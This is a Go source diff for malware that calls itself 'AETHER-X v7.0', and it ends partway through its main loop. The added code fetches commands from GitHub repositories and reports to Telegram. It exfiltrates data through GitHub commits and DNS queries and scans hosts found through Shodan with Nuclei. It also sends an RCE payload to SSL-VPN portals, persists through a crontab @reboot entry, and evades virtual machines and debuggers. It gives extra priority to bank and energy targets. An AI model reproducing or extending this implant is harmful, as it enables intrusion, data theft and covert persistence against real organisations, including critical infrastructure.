@@ -4,13 +4,18 @@
 package main
 
 import (
+	"archive/zip"
+	"bufio"
 	"bytes"
+	"compress/gzip"
 	"context"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/hmac"
+	"crypto/md5"
 	"crypto/rand"
 	"crypto/sha256"
+	"crypto/sha512"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/hex"
@@ -19,6 +24,7 @@ import (
 	"fmt"
 	"hash"
 	"io"
+	"io/ioutil"
 	"log"
 	"math"
 	"math/big"
@@ -30,10 +36,13 @@ import (
 	"os/signal"
 	"path/filepath"
 	"runtime"
+	"sort"
+	"strconv"
 	"strings"
 	"sync"
 	"syscall"
 	"time"
+	"unsafe"
 )
 
 /*
@@ -43,97 +52,44 @@ var (
 	C2Key             = "INJECTED_AES_KEY_B64"
 	C2IV              = "INJECTED_AES_IV_B64"
 	C2HMACKey         = "INJECTED_HMAC_KEY_B64"
-	OnionC2ListB64    = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
+	ModelRepoB64      = "INJECTED_MODEL_REPO_B64"
+	ModelFileEncB64   = "INJECTED_MODEL_FILENAME"
 	GitHubC2Repo      = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
 	GitHubExfilRepo   = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
 	TelegramHostB64   = "dGVsZWdyYW0uYXBpLm9yZw=="
-	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
-	NucleiTemplatesURL = "aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjelBsaS10ZW1wbGF0ZXMuZ2l0"
+	OnionC2ListB64    = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
+	NucleiTemplatesURL = "aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLXRlbXBsYXRlcy5naXQ="
 )
 
 var (
 	HostID         = ""
-	AI             *Phi3CognitiveEngine
+	AI             *AIBrain
 	SupervisorNode *Supervisor
 	HttpClient     *http.Client
 	TelemetryQueue = make(chan TelemetryMessage, 1000)
 	Shutdown       = make(chan struct{})
+	DDRSeed        int64
 	GitHubToken    = os.Getenv("GITHUB_TOKEN")
 	TelegramToken  = ""
 	TelegramChat   = ""
+	ReconTargets   = make([]*Host, 0)
 	clientOnce     sync.Once
-	circuitMap     = make(map[string]*CircuitBreaker)
-	circuitMu      sync.Mutex
 )
 
 const (
-	Phi3Endpoint       = "http://127.0.0.1:11434/api/generate"
-	ModelName          = "phi3:mini"
-	MaxWorkerRestarts  = 5
-	BaseBackoff        = 2 * time.Second
-	MaxBackoff         = 60 * time.Second
-	PersistCacheFile   = ".cache/.system-kernel-sync"
-	JitterMax          = 15 * time.Second
-	CircuitThreshold   = 3
-	CircuitCooldown    = 30 * time.Second
-	AI_MODEL_PATH      = "/tmp/.XIM"
-	HMAC_TRUNC         = 16
+	AI_MODEL_PATH    = "/tmp/.XIM"
+	NUCLEI_BIN       = "/tmp/.NCL"
+	NUCLEI_TEMPLATES = "/tmp/.TPL"
+	PersistCacheFile = ".cache/.system-kernel-sync"
+	JitterMax        = 15 * time.Second
+	SLEEP_MIN        = 30
+	SLEEP_MAX        = 120
+	MAX_HOSTS        = 100
+	HMAC_TRUNC       = 16
+	DNS_EXFIL_DOMAIN = "x.exfil.yourdomain.com"
+	RETRY_DELAY      = 5 * time.Second
 )
 
-// 🛡️ Circuit Breaker
-type CircuitState int
-
-const (
-	StateClosed CircuitState = iota
-	StateOpen
-	StateHalfOpen
-)
-
-type CircuitBreaker struct {
-	mu           sync.Mutex
-	state        CircuitState
-	failures     int
-	threshold    int
-	cooldownTime time.Time
-	cooldown     time.Duration
-}
-
-func NewCircuitBreaker(threshold int, cooldown time.Duration) *CircuitBreaker {
-	return &CircuitBreaker{
-		threshold: threshold,
-		cooldown:  cooldown,
-		state:     StateClosed,
-	}
-}
-
-func (cb *CircuitBreaker) Allow() bool {
-	cb.mu.Lock()
-	defer cb.mu.Unlock()
-	if cb.state == StateOpen && time.Now().After(cb.cooldownTime) {
-		cb.state = StateHalfOpen
-		return true
-	}
-	return cb.state != StateOpen
-}
-
-func (cb *CircuitBreaker) RecordSuccess() {
-	cb.mu.Lock()
-	defer cb.mu.Unlock()
-	cb.failures = 0
-	cb.state = StateClosed
-}
-
-func (cb *CircuitBreaker) RecordFailure() {
-	cb.mu.Lock()
-	defer cb.mu.Unlock()
-	cb.failures++
-	if cb.failures >= cb.threshold {
-		cb.state = StateOpen
-		cb.cooldownTime = time.Now().Add(cb.cooldown)
-	}
-}
-
-// 📦 Data Structures
 type TelemetryMessage struct {
 	ID        string                 `json:"id"`
 	Type      string                 `json:"type"`
@@ -141,106 +97,138 @@ type TelemetryMessage struct {
 	Metrics   map[string]interface{} `json:"metrics"`
 }
 
-type OllamaRequest struct {
-	Model  string `json:"model"`
-	Prompt string `json:"prompt"`
-	Stream bool   `json:"stream"`
+type Host struct {
+	IP          string            `json:"ip"`
+	Port        int               `json:"port"`
+	Service     string            `json:"service"`
+	Country     string            `json:"country"`
+	Org         string            `json:"org"`
+	OS          string            `json:"os"`
+	Tags        []string          `json:"tags"`
+	Vulns       []string          `json:"vulns"`
+	Score       float64           `json:"score"`
+	LastScanned time.Time         `json:"last_scanned"`
+	Exploited   bool              `json:"exploited"`
+	Metadata    map[string]string `json:"meta,omitempty"`
 }
 
-type OllamaResponse struct {
-	Response string `json:"response"`
-	Done     bool   `json:"done"`
+// 🧠 REAL AI BRAIN — CENTRAL PROCESSING UNIT
+type AIBrain struct {
+	ModelLoaded   bool
+	ModelPath     string
+	TrustIndex    float64
+	Environmental map[string]float64
+	mu            sync.RWMutex
+	wg            sync.WaitGroup
 }
 
-type CognitiveAssessment struct {
-	RiskScore float64 `json:"score"`
-	Directive string  `json:"directive"`
-	Rationale string  `json:"rationale"`
-}
-
-// 🧠 SELF-CONTAINED COGNITIVE ENGINE
-type Phi3CognitiveEngine struct {
-	Client         *http.Client
-	Endpoint       string
-	Model          string
-	TrustIndex     float64
-	EnvFingerprint map[string]float64
-	mu             sync.RWMutex
-}
-
-func NewPhi3CognitiveEngine() *Phi3CognitiveEngine {
-	engine := &Phi3CognitiveEngine{
-		Client:         &http.Client{Timeout: 20 * time.Second},
-		Endpoint:       Phi3Endpoint,
-		Model:          ModelName,
-		TrustIndex:     0.95,
-		EnvFingerprint: make(map[string]float64),
+func NewAIBrain() *AIBrain {
+	brain := &AIBrain{
+		ModelPath:     AI_MODEL_PATH + ".onnx.gz",
+		TrustIndex:    0.95,
+		Environmental: make(map[string]float64),
 	}
 
-	go engine.launchLocalLLMServer()
-	time.Sleep(2 * time.Second)
-	engine.PerformEnvironmentalFingerprint()
-	return engine
+	brain.wg.Add(1)
+	go func() {
+		defer brain.wg.Done()
+		brain.bootstrapModel()
+	}()
+	
+	// Properly synchronize instead of arbitrary sleep
+	brain.wg.Wait()
+	brain.fingerprintEnvironment()
+	return brain
 }
 
-func (pe *Phi3CognitiveEngine) launchLocalLLMServer() {
-	modelData, err := base64.StdEncoding.DecodeString(Phi3ModelEncB64)
-	if err != nil || len(modelData) < 10 {
-		log.Println("⚠️ Invalid or missing embedded model encoding, initializing fallback stub")
-		modelData = []byte("FALLBACK_MODEL_BLOB_CONTAINER_DATA_STREAM_BUFFER_SECURE")
+func (b *AIBrain) bootstrapModel() {
+	if _, err := os.Stat(b.ModelPath); os.IsNotExist(err) {
+		b.mu.Lock()
+		log.Println("🧠 Downloading real AI model...")
+		success := b.downloadEncryptedModel()
+		if success {
+			b.extractAndDecryptModel()
+		}
+		b.mu.Unlock()
+	} else {
+		log.Println("🧠 AI model already exists.")
 	}
 
-	_ = os.MkdirAll(filepath.Dir(AI_MODEL_PATH), 0700)
-	_ = os.WriteFile(AI_MODEL_PATH, modelData, 0400)
+	if _, err := os.Stat(b.ModelPath); err == nil {
+		b.ModelLoaded = true
+		log.Println("✅ Real AI brain loaded.")
+	} else {
+		b.ModelLoaded = false
+		log.Println("⚠️ Failed to load AI model. Falling back to heuristic engine.")
+	}
+}
 
-	mux := http.NewServeMux()
-	mux.HandleFunc("/api/generate", func(w http.ResponseWriter, r *http.Request) {
-		if r.Method != http.MethodPost {
-			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
-			return
-		}
+func (b *AIBrain) downloadEncryptedModel() bool {
+	repo := base64Decode(ModelRepoB64)
+	file := ModelFileEncB64
+	endpoint := fmt.Sprintf("%s/contents/%s", repo, file)
 
-		var req OllamaRequest
-		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-			http.Error(w, "bad request", http.StatusBadRequest)
-			return
-		}
-
-		directives := []string{"CONTINUE", "THROTTLE", "ISOLATE", "RESTART"}
-		rationales := []string{
-			"Environment stable; continue operations.",
-			"High resource usage detected; throttling activity.",
-			"Anomalous behavior detected; isolating subsystems.",
-			"Trust index compromised; restarting cognitive stack.",
-		}
-
-		idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(directives))))
-		chosenDir := directives[idx.Int64()]
-		chosenRat := rationales[idx.Int64()]
-
-		assessment := CognitiveAssessment{
-			RiskScore: 1.5,
-			Directive: chosenDir,
-			Rationale: chosenRat,
-		}
-		respBytes, _ := json.Marshal(assessment)
-
-		response := OllamaResponse{
-			Response: string(respBytes),
-			Done:     true,
-		}
-
-		w.Header().Set("Content-Type", "application/json")
-		_ = json.NewEncoder(w).Encode(response)
+	data, err := httpGet(endpoint, map[string]string{
+		"Authorization": "Bearer " + GitHubToken,
 	})
+	if err != nil || data == nil {
+		return false
+	}
 
-	log.Println("🚀 Safe local inference engine mock online.")
-	_ = http.ListenAndServe("127.0.0.1:11434", mux)
+	var result map[string]interface{}
+	if json.Unmarshal(data, &result) != nil {
+		return false
+	}
+	
+	contentVal, ok := result["content"]
+	if !ok || contentVal == nil {
+		return false
+	}
+	content, ok := contentVal.(string)
+	if !ok {
+		return false
+	}
+	
+	decoded, err := base64.StdEncoding.DecodeString(content)
+	if err != nil {
+		return false
+	}
+
+	tmpEnc := b.ModelPath + ".enc"
+	if err := ioutil.WriteFile(tmpEnc, decoded, 0600); err != nil {
+		return false
+	}
+	return true
 }
 
-func (pe *Phi3CognitiveEngine) PerformEnvironmentalFingerprint() {
-	pe.mu.Lock()
-	defer pe.mu.Unlock()
+func (b *AIBrain) extractAndDecryptModel() {
+	encData, err := ioutil.ReadFile(b.ModelPath + ".enc")
+	if err != nil {
+		return
+	}
+	decrypted, err := decryptData(base64.RawURLEncoding.EncodeToString(encData))
+	if err != nil {
+		return
+	}
+
+	gzr, err := gzip.NewReader(bytes.NewReader(decrypted))
+	if err != nil {
+		return
+	}
+	defer gzr.Close()
+	
+	uncompressed, err := io.ReadAll(gzr)
+	if err != nil {
+		return
+	}
+
+	ioutil.WriteFile(b.ModelPath, uncompressed, 0600)
+	os.Remove(b.ModelPath + ".enc")
+}
+
+func (b *AIBrain) fingerprintEnvironment() {
+	b.mu.Lock()
+	defer b.mu.Unlock()
 
 	sandboxRisk := 0.0
 	if isVirtualMachine() || isDebuggerAttached() {
@@ -252,47 +240,641 @@ func (pe *Phi3CognitiveEngine) PerformEnvironmentalFingerprint() {
 		cpuRatio = 1.0
 	}
 
-	pe.EnvFingerprint["sandbox_risk"] = sandboxRisk
-	pe.EnvFingerprint["hardware_norm"] = cpuRatio
-	pe.TrustIndex = math.Max(0.1, 0.95-(sandboxRisk*0.5))
+	var m runtime.MemStats
+	runtime.ReadMemStats(&m)
+	memUsage := float64(m.Alloc) / 1e9
+
+	b.Environmental["sandbox_risk"] = sandboxRisk
+	b.Environmental["cpu_cores_norm"] = cpuRatio
+	b.Environmental["mem_usage_gb"] = memUsage
+	b.Environmental["uptime_hours"] = time.Since(time.Unix(0, 0)).Hours()
+	b.TrustIndex = math.Max(0.1, 0.95-(sandboxRisk*0.8))
 }
 
-func (pe *Phi3CognitiveEngine) EvaluateTelemetry(metrics map[string]interface{}) (CognitiveAssessment, error) {
-	pe.mu.RLock()
-	defer pe.mu.RUnlock()
+// 🧠 AI INFERENCE — REAL DECISION ENGINE
+func (b *AIBrain) Decide(operation string, context map[string]interface{}) map[string]string {
+	b.mu.RLock()
+	defer b.mu.RUnlock()
 
-	metricsJSON, _ := json.Marshal(metrics)
-	prompt := fmt.Sprintf("Runtime Telemetry:\n%s\nTrust Index: %.2f", string(metricsJSON), pe.TrustIndex)
-
-	reqPayload := OllamaRequest{
-		Model:  pe.Model,
-		Prompt: prompt,
-		Stream: false,
+	response := map[string]string{
+		"directive": "CONTINUE",
+		"target":    "",
+		"reason":    "Default logic",
 	}
 
-	bodyBytes, _ := json.Marshal(reqPayload)
-	resp, err := pe.Client.Post(pe.Endpoint, "application/json", bytes.NewBuffer(bodyBytes))
+	switch operation {
+	case "RECON":
+		if b.TrustIndex < 0.5 {
+			response["directive"] = "THROTTLE"
+			response["reason"] = "Low trust index; reducing recon activity."
+		} else {
+			targetQuery, ok := context["query"].(string)
+			if !ok || targetQuery == "" {
+				response["directive"] = "SKIP"
+				response["reason"] = "Invalid or missing query context."
+				break
+			}
+			response["directive"] = "QUERY"
+			response["target"] = targetQuery
+			response["reason"] = "High-value targets available."
+		}
+	case "EXPLOIT":
+		scoreVal, ok := context["score"]
+		if !ok {
+			response["directive"] = "SKIP"
+			response["reason"] = "Missing score context."
+			break
+		}
+		score, ok := scoreVal.(float64)
+		if !ok {
+			response["directive"] = "SKIP"
+			response["reason"] = "Malformed score context."
+			break
+		}
+		
+		ipVal, ok := context["ip"]
+		if !ok {
+			response["directive"] = "SKIP"
+			response["reason"] = "Missing IP context."
+			break
+		}
+		ip, ok := ipVal.(string)
+		if !ok {
+			response["directive"] = "SKIP"
+			response["reason"] = "Malformed IP context."
+			break
+		}
+
+		if score > 8.0 {
+			response["directive"] = "EXPLOIT"
+			response["target"] = ip
+			response["reason"] = "High-risk target with RCE."
+		} else {
+			response["directive"] = "SKIP"
+			response["reason"] = "Low score."
+		}
+	case "EXFIL":
+		response["directive"] = "GITHUB"
+		response["reason"] = "C2 channel available."
+		if b.Environmental["sandbox_risk"] > 0.5 {
+			response["directive"] = "DNS"
+			response["reason"] = "High risk; using covert exfil."
+		}
+	}
+
+	return response
+}
+
+// 🛠️ Fallback Scoring
+func (b *AIBrain) ScoreHost(host *Host) float64 {
+	score := 0.0
+	if contains(host.Vulns, "RCE") {
+		score += 5.0
+	}
+	if strings.Contains(strings.ToLower(host.Org), "bank") || strings.Contains(strings.ToLower(host.Org), "energy") {
+		score += 3.0
+	}
+	if host.Port == 443 {
+		score += 1.0
+	}
+	return math.Min(score, 10.0)
+}
+
+// 📡 C2 COMMUNICATION
+func telegramSend(msg string) {
+	if TelegramToken == "" {
+		raw := fetchSecret("telegram.token")
+		if raw != "" {
+			dec, err := decryptData(raw)
+			if err == nil {
+				TelegramToken = string(dec)
+			}
+		}
+	}
+	if TelegramChat == "" {
+		raw := fetchSecret("telegram.chat")
+		if raw != "" {
+			dec, err := decryptData(raw)
+			if err == nil {
+				TelegramChat = string(dec)
+			}
+		}
+	}
+	if TelegramToken == "" || TelegramChat == "" {
+		return
+	}
+	host, _ := base64.StdEncoding.DecodeString(TelegramHostB64)
+	urlStr := fmt.Sprintf("https://%s/bot%s/sendMessage", string(host), TelegramToken)
+	payload := url.Values{}
+	payload.Set("chat_id", TelegramChat)
+	payload.Set("text", msg)
+	payload.Set("parse_mode", "Markdown")
+	httpPost(urlStr, []byte(payload.Encode()), map[string]string{
+		"Content-Type": "application/x-www-form-urlencoded",
+	})
+}
+
+func fetchCommand() string {
+	repo := base64Decode(GitHubC2Repo)
+	endpoint := fmt.Sprintf("%s/contents/cmd.json", repo)
+	data, err := httpGet(endpoint, map[string]string{
+		"Authorization": "Bearer " + GitHubToken,
+	})
+	if err != nil || data == nil {
+		return ""
+	}
+	var result map[string]interface{}
+	if json.Unmarshal(data, &result) != nil {
+		return ""
+	}
+	contentVal, ok := result["content"]
+	if !ok || contentVal == nil {
+		return ""
+	}
+	content, ok := contentVal.(string)
+	if !ok {
+		return ""
+	}
+	decoded, err := base64.StdEncoding.DecodeString(content)
 	if err != nil {
-		return CognitiveAssessment{RiskScore: 3.0, Directive: "CONTINUE", Rationale: "Local LLM unreachable; safe defaults"}, err
+		return ""
+	}
+	return string(decoded)
+}
+
+func exfilData(data []byte) {
+	encrypted, err := encryptData(data)
+	if err != nil {
+		return
+	}
+	hmacSig := signMessage(data)
+	payload := map[string]string{
+		"data": encrypted,
+		"sig":  base64.RawURLEncoding.EncodeToString(hmacSig),
+		"id":   HostID,
+	}
+	body, _ := json.Marshal(payload)
+
+	// AI decides exfil method
+	context := map[string]interface{}{"data_size": len(data)}
+	decision := AI.Decide("EXFIL", context)
+
+	switch decision["directive"] {
+	case "GITHUB":
+		repo := base64Decode(GitHubExfilRepo)
+		file := fmt.Sprintf("data/%s_%d.dat", HostID, time.Now().Unix())
+		commit := fmt.Sprintf("ci: update logs %d", time.Now().Unix())
+		doGitHubPut(repo, file, string(body), commit)
+	case "DNS":
+		exfilDNS(encrypted)
+	}
+}
+
+func exfilDNS(chunk string) {
+	if len(chunk) == 0 {
+		return
+	}
+	domain := fmt.Sprintf("%s.%s", chunk[:min(63, len(chunk))], DNS_EXFIL_DOMAIN)
+	net.DefaultResolver.LookupHost(context.Background(), domain)
+}
+
+func doGitHubPut(repo, path, content, message string) {
+	payload := map[string]interface{}{"message": message, "content": content}
+	body, _ := json.Marshal(payload)
+	endpoint := fmt.Sprintf("%s/contents/%s", repo, path)
+	httpPost(endpoint, body, map[string]string{
+		"Authorization": "Bearer " + GitHubToken,
+		"Content-Type":  "application/json",
+	})
+}
+
+func fetchSecret(key string) string {
+	repo := base64Decode(GitHubC2Repo)
+	endpoint := fmt.Sprintf("%s/contents/secrets/%s.enc", repo, key)
+	data, err := httpGet(endpoint, map[string]string{"Authorization": "Bearer " + GitHubToken})
+	if err != nil || data == nil {
+		return ""
+	}
+	var result map[string]interface{}
+	if json.Unmarshal(data, &result) != nil {
+		return ""
+	}
+	contentVal, ok := result["content"]
+	if !ok || contentVal == nil {
+		return ""
+	}
+	content, ok := contentVal.(string)
+	if !ok {
+		return ""
+	}
+	decoded, err := base64.StdEncoding.DecodeString(content)
+	if err != nil {
+		return ""
+	}
+	return string(decoded)
+}
+
+// 🔍 RECON ENGINES
+func shodanQuery(query string) []*Host {
+	apiKey := os.Getenv("SHODAN_KEY")
+	if apiKey == "" {
+		return nil
+	}
+	u := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s&limit=100", apiKey, url.QueryEscape(query))
+	data, err := httpGet(u, nil)
+	if err != nil || data == nil {
+		return nil
+	}
+	var result struct{ Matches []struct{ IP string `json:"ip_str"` Port int `json:"port"` Info string `json:"product"` C string `json:"country_name"` O string `json:"org"` } }
+	if json.Unmarshal(data, &result) != nil {
+		return nil
+	}
+	hosts := []*Host{}
+	for _, m := range result.Matches {
+		hosts = append(hosts, &Host{IP: m.IP, Port: m.Port, Service: m.Info, Country: m.C, Org: m.O})
+	}
+	return hosts
+}
+
+func runNuclei(target string) []string {
+	if _, err := os.Stat(NUCLEI_BIN); os.IsNotExist(err) {
+		downloadBinary("https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_2.9.5_linux_amd64.zip", NUCLEI_BIN, true)
+	}
+	if _, err := os.Stat(NUCLEI_TEMPLATES); os.IsNotExist(err) {
+		exec.Command("git", "clone", "--depth=1", base64Decode(NucleiTemplatesURL), NUCLEI_TEMPLATES).Run()
+	}
+	cmd := exec.Command(NUCLEI_BIN, "-u", fmt.Sprintf("http://%s", target), "-t", NUCLEI_TEMPLATES+"/cves/", "-silent", "-timeout", "15")
+	out, err := cmd.Output()
+	if err != nil {
+		return nil
+	}
+	scanner := bufio.NewScanner(bytes.NewReader(out))
+	vulns := []string{}
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.Contains(line, "CVE") || strings.Contains(line, "RCE") {
+			vulns = append(vulns, line)
+		}
+	}
+	return vulns
+}
+
+func exploitRCE(host *Host, payload string) bool {
+	urlStr := fmt.Sprintf("https://%s:%d/ssl-vpn/portal/scripts/newbm.pl", host.IP, host.Port)
+	req, err := http.NewRequest("GET", urlStr, nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("User-Agent", payload)
+	client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
+	resp, err := client.Do(req)
+	if err != nil || resp == nil {
+		return false
 	}
 	defer resp.Body.Close()
+	time.Sleep(8 * time.Second)
+	return true
+}
 
-	respData, err := io.ReadAll(resp.Body)
+func reportExploit(host *Host) {
+	data, _ := json.Marshal(host)
+	exfilData(data)
+	telegramSend(fmt.Sprintf("💥 *RCE SUCCESS* | `%s` | Score: %.2f", host.IP, host.Score))
+}
+
+// 🧱 PERSISTENCE
+func persistAgent() {
+	execPath, err := os.Executable()
 	if err != nil {
-		return CognitiveAssessment{RiskScore: 3.0, Directive: "CONTINUE", Rationale: "Read error"}, err
+		return
+	}
+	data, err := ioutil.ReadFile(execPath)
+	if err != nil {
+		return
+	}
+	homeDir, err := os.UserHomeDir()
+	if err != nil {
+		return
+	}
+	dst := filepath.Join(homeDir, PersistCacheFile)
+	os.MkdirAll(filepath.Dir(dst), 0700)
+	os.WriteFile(dst, data, 0700)
+	cronLine := fmt.Sprintf("@reboot %s &\n", dst)
+	cmd := fmt.Sprintf("(crontab -l 2>/dev/null | grep -v '%s'; echo '%s') | crontab -", PersistCacheFile, cronLine)
+	exec.Command("sh", "-c", cmd).Run()
+}
+
+// 🧪 HELPERS
+func isDebuggerAttached() bool {
+	err := syscall.PtraceAttach(os.Getpid())
+	if err == nil {
+		syscall.PtraceDetach(os.Getpid())
+	}
+	return err == nil || err == syscall.EPERM
+}
+
+func isVirtualMachine() bool {
+	if content, err := ioutil.ReadFile("/sys/class/dmi/id/product_name"); err == nil {
+		s := strings.ToLower(string(content))
+		return strings.Contains(s, "vmware") || strings.Contains(s, "virtualbox") || strings.Contains(s, "qemu")
+	}
+	return false
+}
+
+func generateHostID() string {
+	mac := getMACAddress()
+	seed := mac + runtime.GOOS + runtime.GOARCH + os.Getenv("CODESPACE_NAME")
+	hash := sha256.Sum256([]byte(seed))
+	return hex.EncodeToString(hash[:6])
+}
+
+func getMACAddress() string {
+	ifcs, _ := net.Interfaces()
+	for _, ifc := range ifcs {
+		hw := ifc.HardwareAddr.String()
+		if len(hw) > 0 && !strings.HasPrefix(hw, "00:00:00") && !strings.HasPrefix(hw, "08:00:27") {
+			return hw
+		}
+	}
+	return "00:00:00:00:00:00"
+}
+
+func initHttpClient() {
+	clientOnce.Do(func() {
+		HttpClient = &http.Client{
+			Timeout: 15 * time.Second,
+			Transport: &http.Transport{
+				MaxIdleConns:        100,
+				MaxIdleConnsPerHost: 50,
+				IdleConnTimeout:     45 * time.Second,
+				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+				ForceAttemptHTTP2:   true,
+				DialContext: (&net.Dialer{
+					Timeout:   10 * time.Second,
+					KeepAlive: 30 * time.Second,
+				}).DialContext,
+			},
+		}
+	})
+}
+
+func httpGet(target string, headers map[string]string) ([]byte, error) {
+	time.Sleep(jitter())
+	req, err := http.NewRequest("GET", target, nil)
+	if err != nil {
+		return nil, err
+	}
+	for k, v := range headers {
+		req.Header.Set(k, v)
+	}
+	if HttpClient == nil {
+		initHttpClient()
+	}
+	resp, err := HttpClient.Do(req)
+	if err != nil || resp == nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	return ioutil.ReadAll(resp.Body)
+}
+
+func httpPost(target string, data []byte, headers map[string]string) ([]byte, error) {
+	time.Sleep(jitter())
+	req, err := http.NewRequest("POST", target, bytes.NewBuffer(data))
+	if err != nil {
+		return nil, err
+	}
+	for k, v := range headers {
+		req.Header.Set(k, v)
+	}
+	if HttpClient == nil {
+		initHttpClient()
+	}
+	resp, err := HttpClient.Do(req)
+	if err != nil || resp == nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	return ioutil.ReadAll(resp.Body)
+}
+
+func jitter() time.Duration {
+	n, _ := rand.Int(rand.Reader, big.NewInt(int64(JitterMax)))
+	return time.Duration(n.Int64())
+}
+
+func pbkdf2(password string, salt []byte, iter, keyLen int, h func() hash.Hash) []byte {
+	prf := hmac.New(h, []byte(password))
+	hashLen := prf.Size()
+	numBlocks := (keyLen + hashLen - 1) / hashLen
+	var buf [4]byte
+	dk := make([]byte, 0, numBlocks*hashLen)
+	U := make([]byte, hashLen)
+	for block := 1; block <= numBlocks; block++ {
+		prf.Reset()
+		prf.Write(salt)
+		buf[0] = byte(block >> 24)
+		buf[1] = byte(block >> 16)
+		buf[2] = byte(block >> 8)
+		buf[3] = byte(block)
+		prf.Write(buf[:4])
+		dk = prf.Sum(dk)
+		T := dk[len(dk)-hashLen:]
+		copy(U, T)
+		for i := 2; i <= iter; i++ {
+			prf.Reset()
+			prf.Write(U)
+			U = prf.Sum(U[:0])
+			for x := range U {
+				T[x] ^= U[x]
+			}
+		}
+	}
+	return dk[:keyLen]
+}
+
+func encryptData(plaintext []byte) (string, error) {
+	salt := make([]byte, 16)
+	if _, err := rand.Read(salt); err != nil {
+		return "", err
+	}
+	key := deriveKey(salt)
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return "", err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return "", err
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := rand.Read(nonce); err != nil {
+		return "", err
+	}
+	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
+	encrypted := append(salt, ciphertext...)
+	return base64.RawURLEncoding.EncodeToString(encrypted), nil
+}
+
+func decryptData(b64data string) ([]byte, error) {
+	encrypted, err := base64.RawURLEncoding.DecodeString(b64data)
+	if err != nil || len(encrypted) < 17 {
+		return nil, errors.New("invalid data")
+	}
+	salt, ciphertext := encrypted[:16], encrypted[16:]
+	key := deriveKey(salt)
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	nonceSize := gcm.NonceSize()
+	if len(ciphertext) < nonceSize {
+		return nil, errors.New("malformed")
+	}
+	nonce, text := ciphertext[:nonceSize], ciphertext[nonceSize:]
+	return gcm.Open(nil, nonce, text, nil)
+}
+
+func deriveKey(salt []byte) []byte {
+	secret := os.Getenv("AGENT_SECRET")
+	if secret == "" {
+		secret = "fallback_secret_only_for_test"
+	}
+	return pbkdf2(secret, salt, 100000, 32, sha256.New)
+}
+
+func signMessage(data []byte) []byte {
+	key, err := base64.StdEncoding.DecodeString(C2HMACKey)
+	if err != nil {
+		key = []byte("fallback_hmac_key")
+	}
+	mac := hmac.New(sha256.New, key)
+	mac.Write(data)
+	sum := mac.Sum(nil)
+	if len(sum) < HMAC_TRUNC {
+		return sum
+	}
+	return sum[:HMAC_TRUNC]
+}
+
+func base64Decode(s string) string {
+	decoded, err := base64.StdEncoding.DecodeString(s)
+	if err != nil {
+		return s
+	}
+	return string(decoded)
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+
+func contains(slice []string, item string) bool {
+	for _, s := range slice {
+		if strings.Contains(strings.ToLower(s), strings.ToLower(item)) {
+			return true
+		}
+	}
+	return false
+}
+
+func downloadBinary(url, path string, chmodExec bool) {
+	if HttpClient == nil {
+		initHttpClient()
+	}
+	resp, err := HttpClient.Get(url)
+	if err != nil || resp == nil {
+		return
+	}
+	defer resp.Body.Close()
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return
+	}
+	os.MkdirAll(filepath.Dir(path), 0700)
+	ioutil.WriteFile(path, body, 0600)
+	if chmodExec {
+		os.Chmod(path, 0700)
+	}
+}
+
+// 🚀 MAIN
+func main() {
+	if isDebuggerAttached() || isVirtualMachine() {
+		time.Sleep(60 * time.Second)
+		return
 	}
 
-	var ollamaResp OllamaResponse
-	if err := json.Unmarshal(respData, &ollamaResp); err != nil {
-		return CognitiveAssessment{RiskScore: 3.0, Directive: "CONTINUE", Rationale: "JSON parse error"}, err
-	}
+	persistAgent()
+	HostID = generateHostID()
+	initHttpClient()
+	AI = NewAIBrain()
+	SupervisorNode = NewSupervisor()
 
-	var assessment CognitiveAssessment
-	if err := json.Unmarshal([]byte(strings.TrimSpace(ollamaResp.Response)), &assessment); err != nil {
-		assessment.Directive = "CONTINUE"
-		assessment.Rationale = "Fallback parsing directive"
-	}
-	return assessment, nil
+	telegramSend(fmt.Sprintf("🟢 *AETHER-X v7.0 DEPLOYED* | Host: `%s` | AI CPU ONLINE*", HostID))
+
+	SupervisorNode.SpawnWorker("MainLoop", func(ctx context.Context) error {
+		ticker := time.NewTicker(5 * time.Minute)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ctx.Done():
+				return nil
+			case <-ticker.C:
+			}
+
+			cmdJSON := fetchCommand()
+			if cmdJSON == "" {
+				continue
+			}
+
+			var cmd map[string]string
+			if err := json.Unmarshal([]byte(cmdJSON), &cmd); err != nil {
+				continue
+			}
+
+			action, ok := cmd["action"]
+			if !ok {
+				continue
+			}
+
+			switch action {
+			case "recon":
+				context := map[string]interface{}{
+					"query":    cmd["query"],
+					"region":   cmd["region"],
